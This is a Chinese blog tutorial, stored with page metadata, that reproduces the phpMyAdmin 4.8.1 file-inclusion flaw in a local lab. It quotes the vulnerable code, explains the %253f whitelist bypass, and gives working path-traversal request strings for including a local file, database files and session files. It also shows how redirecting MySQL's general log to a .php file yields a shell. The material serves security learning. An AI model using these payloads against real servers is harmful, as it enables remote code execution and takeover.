{"blogid": "124076313", "writerAge": "码龄2年", "writerBlogNum": "35", "writerCollect": "178", "writerComment": "4", "writerFan": "18", "writerGrade": "2级", "writerIntegral": "393", "writerName": "七点只", "writerProfileAdress": "writer_image\\profile_124076313.jpg", "writerRankTotal": "89620", "writerRankWeekly": "488910", "writerThumb": "39", "writerVisitNum": "51696", "blog_read_count": "3304", "blog_time": "于 2022-04-10 12:57:51 发布", "blog_title": "phpmyadmin4.8.1漏洞复现-远程文件包含", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"htmledit_views\" id=\"content_views\">\n<p>phpMyAdmin4.8.0 - 4.8.1版本均受漏洞影响。</p>\n<p>环境搭建：phpstudy+windows+phpmyadmin4.8.1</p>\n<p>注意要将phpmyadmin解压下载到phpstudy网站根目录</p>\n<p>像我这里的根目录就是在www目录这里</p>\n<p class=\"img-center\"><img alt=\"\" src=\"image\\aa4c1b72b2e99082e128f2efe120ca94.png\"/></p>\n<p>解压之后再打开localhost/phpMyAdmin 或者127.0.0.1/phpMyAdmin</p>\n<p><img alt=\"\" height=\"741\" src=\"image\\94cc2a2f896e4b9785850be0dd622286.png\" width=\"1200\"/></p>\n<p> </p>\n<p>默认的初始账号和密码都是root，但是由于我之前修改了mysql的密码，所以这个密码就和MySQL的密码一样</p>\n<p>然后来到这个phpmyadmin这个目录这里，找到index.php这个文件</p>\n<p class=\"img-center\"><img alt=\"\" src=\"image\\039ee85b68cd84036f0c4b2ee481565d.png\"/></p>\n<p>然后打开查看bug的两处代码</p>\n<p>1、phpMYAdmin/index的51-64行</p>\n<pre><code>$target_blacklist = array (\n    'import.php', 'export.php'\n);\n​\n// If we have a valid target, let's load that script instead\nif (! empty($_REQUEST['target'])\n    &amp;&amp; is_string($_REQUEST['target'])\n    &amp;&amp; ! preg_match('/^index/', $_REQUEST['target'])\n    &amp;&amp; ! in_array($_REQUEST['target'], $target_blacklist)\n    &amp;&amp; Core::checkPageValidity($_REQUEST['target'])\n) {\n    include $_REQUEST['target'];\n    exit;\n}</code></pre>\n<p>根据这几行代码可知要将$_REQUEST[‘target’]所表示的文件包含进来<strong>target</strong>参数需要满足以下5个条件：</p>\n<p>1.不为空</p>\n<p>2.是一个字符串</p>\n<p>3.不能以index开头</p>\n<p>4.不能在 $target_blacklist数组里面(即不能为import.php,export.php)</p>\n<p>5.满足Core类里面的checkPageValidity()函数检查 前四个可以轻松绕过，来看看第五个条件</p>\n<p>接着找它的checkPageValidity（）函数</p>\n<p>在这个文件这：D:\\phpstudy_pro\\WWW\\phpMyAdmin\\libraries\\classes\\core.php</p>\n<p class=\"img-center\"><img alt=\"\" src=\"image\\21318d328d4826617dd47555f79ff106.png\"/></p>\n<p>它的白名单</p>\n<pre><code> public static $goto_whitelist = array(\n        'db_datadict.php',\n        'db_sql.php',\n        'db_events.php',\n        'db_export.php',\n        'db_importdocsql.php',\n        'db_multi_table_query.php',\n        'db_structure.php',\n        'db_import.php',\n        'db_operations.php',\n        'db_search.php',\n        'db_routines.php',\n        'export.php',\n        'import.php',\n        'index.php',\n        'pdf_pages.php',\n        'pdf_schema.php',\n        'server_binlog.php',\n        'server_collations.php',\n        'server_databases.php',\n        'server_engines.php',\n        'server_export.php',\n        'server_import.php',\n        'server_privileges.php',\n        'server_sql.php',\n        'server_status.php',\n        'server_status_advisor.php',\n        'server_status_monitor.php',\n        'server_status_queries.php',\n        'server_status_variables.php',\n        'server_variables.php',\n        'sql.php',\n        'tbl_addfield.php',\n        'tbl_change.php',\n        'tbl_create.php',\n        'tbl_import.php',\n        'tbl_indexes.php',\n        'tbl_sql.php',\n        'tbl_export.php',\n        'tbl_operations.php',\n        'tbl_structure.php',\n        'tbl_relation.php',\n        'tbl_replace.php',\n        'tbl_row_action.php',\n        'tbl_select.php',\n        'tbl_zoom_select.php',\n        'transformation_overview.php',\n        'transformation_wrapper.php',\n        'user_password.php',\n    );</code></pre>\n<pre>\n</pre>\n<p>2.phpMyAdmin\\libraries\\classes\\Core.php的443-476行,checkPageValidity()函数</p>\n<pre><code>public static function checkPageValidity(&amp;$page, array $whitelist = [])\n    {\n        if (empty($whitelist)) {\n            $whitelist = self::$goto_whitelist;\n        }\n        if (! isset($page) || !is_string($page)) {\n            return false;\n        }\n​\n        if (in_array($page, $whitelist)) {\n            return true;\n        }\n​\n        $_page = mb_substr(\n            $page,\n            0,\n            mb_strpos($page . '?', '?')  //查找字符串在另一字符串中的首次出现位置\n        );\n        if (in_array($_page, $whitelist)) {\n            return true;\n        }\n​\n        $_page = urldecode($page);\n        $_page = mb_substr(\n            $_page,\n            0,\n            mb_strpos($_page . '?', '?')\n        );\n        if (in_array($_page, $whitelist)) {\n            return true;\n        }\n​\n        return false;\n    }</code></pre>\n<pre>\n</pre>\n<p>然后这个的绕过就是要利用url解码，先将？进行两次加密，两次加密的值就是%253f，第一次url解码是由服务器自动解码的，然后经过urldecode之后变为？截取前面的值，所以前面我们传入一个在白名单里的值</p>\n<p>在HCTF 2018]WarmUp里就是对这个的考察</p>\n<p>结合这个两个就可以进行复现了</p>\n<p>漏洞利用的两种方式：</p>\n<p>1、任意包含文件</p>\n<p>包含本地的文件，文件中可以写入想要执行的代码</p>\n<p>我在D盘的根目录这个写下一句php代码</p>\n<p class=\"img-center\"><img alt=\"\" src=\"image\\95a877db54da9a95a0b896c979ba9911.png\"/></p>\n<p>写入：</p>\n<pre><code>?target=db_sql.php%253f../../../../../222.php</code></pre>\n<p><img alt=\"\" height=\"613\" src=\"image\\f6a8f4d09ce74386a706de1c6086e627.png\" width=\"1200\"/></p>\n<p> </p>\n<p>2、任意包含代码</p>\n<p>（包含任意数据库文件）</p>\n<p>先创建一个数据库用来写入要执行的代码</p>\n<p><img alt=\"\" height=\"272\" src=\"image\\ce5746f9056f4c95b61076d41f31ff37.png\" width=\"681\"/></p>\n<p> </p>\n<p>当然也可以写入其他代码，或者一句话</p>\n<pre><code>CREATE DATABASE test;\nUSE test;\nCREATE TABLE test(code VARCHAR(100));\nINSERT INTO test(code) VALUES(\"&lt;?php phpinfo();?&gt;\")</code></pre>\n<p>然后点击执行，它会显示执行成功</p>\n<p><img alt=\"\" height=\"624\" src=\"image\\a39b771996994cc0ab72845743f1c451.png\" width=\"852\"/></p>\n<p> </p>\n<p>我们要将刚刚写入的该文件包含进来，所以要查看数据库的路径</p>\n<pre>查找数据库文件位置使用命令\n</pre>\n<pre><code>SHOW GLOBAL VARIABLES LIKE \"%datadir%\"</code></pre>\n<p><img alt=\"\" height=\"302\" src=\"image\\d45abbb2ba1d494f8be6352fd0cfab81.png\" width=\"775\"/></p>\n<p> </p>\n<p>输入：</p>\n<pre><code>?target=db_sql.php%253f../../../../Extensions/MySQL5.7.26/data/test/test.MYD</code></pre>\n<p><img alt=\"\" height=\"479\" src=\"image\\5336fc6fff1d40349ddd236158efe598.png\" width=\"1200\"/></p>\n<p> </p>\n<p>（包含session文件）</p>\n<p>先写入：</p>\n<pre><code>select \"&lt;?php phpinfo();?&gt;\"</code></pre>\n<p>然后执行</p>\n<p><img alt=\"\" height=\"516\" src=\"image\\21085e969cc54ad1bbe1162506b32938.png\" width=\"1200\"/></p>\n<p> </p>\n<p>找到session</p>\n<p class=\"img-center\"><img alt=\"\" src=\"image\\7fbf574b1eace49d7f19af99702464e2.png\"/></p>\n<p class=\"img-center\"><img alt=\"\" src=\"image\\954f828d0f6a66ee4bba39f93c6de6ac.png\"/></p>\n<p>输入：</p>\n<pre><code>index.php?target=db_sql.php%253f../../../../Extensions/tmp/tmp/sess_ega973hkh0om2qma51483nbg0j</code></pre>\n<p class=\"img-center\"><img alt=\"\" src=\"image\\e755217655cf0a961d30683867a7465c.png\"/></p>\n<p>3、改变写入的日志的路径</p>\n<p>MySQL全局变量（general_log、general_log file）</p>\n<p>general log 指定日志保存状态，一共有两个值（ON/OFF）ON代表开启 OFF代表关闭。</p>\n<p>general log file 指的是日志的保存路径</p>\n<p>mysql 5.0版本以上会创建日志文件，修改日志的全局变量，也可以getshell。但是也要对生成的日志有可读可写的权限。 查看日志状态：</p>\n<pre><code>SHOW VARIABLES LIKE '%general%';</code></pre>\n<p class=\"img-center\"><img alt=\"\" src=\"image\\d2c22b87da80436da4cb1a33ca64d6ac.png\"/></p>\n<p>当 general_log=ON 时，所执行的sql语句都会出现在 /var/lib/mysql/1e164993aaf5.log 文件。那么，如果把 general_log_file 的路径修改为 我们自己指定的目录，那么所执行的sql语句就会保存在该目录中，如果我们执行一个php小马，就可以getshell</p>\n<p>执行</p>\n<pre><code>SET GLOBAL general_log='on'</code></pre>\n<p>再执行：</p>\n<pre><code>SET GLOBAL general_log_file='D:/222.php'</code></pre>\n<p>若是路径不存在的话就会报错，所以也可以用于探测目录</p>\n<p>此时我们再次查看路径</p>\n<p class=\"img-center\"><img alt=\"\" src=\"image\\c6f76361393384cb05ced91bdc773981.png\"/></p>\n<p>因为这是日志的路径所以我们select &lt;?php phppinfo();?&gt;也会写入到这个文件中，然后再利用include来执行就可以达到我们的目的了，当然也可以写入一句话</p>\n<p class=\"img-center\"><img alt=\"\" src=\"image\\e0e09000ba0d028af55a7c7a25698cb5.png\"/></p>\n<p>注：笔记是我从其他网站上搜索后复现写下的</p>\n</div>\n</div>"}